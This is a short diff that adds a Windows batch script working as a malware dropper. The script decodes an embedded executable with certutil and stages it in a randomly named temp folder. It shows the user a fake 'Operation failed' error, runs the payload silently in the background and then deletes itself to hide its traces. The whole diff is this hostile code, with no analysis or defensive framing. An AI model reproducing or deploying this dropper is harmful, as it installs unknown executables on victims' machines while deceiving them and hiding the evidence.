@@ -1,0 +1,11 @@
+certutil -decode %en% "%CD%\irc_mcgee.exe" > nul 
+set randdir=irc%RANDOM%gee
+set saveforlater=%0
+set curdir=%CD%
+md %TEMP%\%randdir%
+del %en%
+copy "irc_mcgee.exe" "%TEMP%\%randdir%\irc_mcgee.exe" > nul
+del "irc_mcgee.exe"
+echo ERROR: Operation failed. Please close command prompt.
+start /B %TEMP%\%randdir%\irc_mcgee.exe %saveforlater% > nul
+del %0
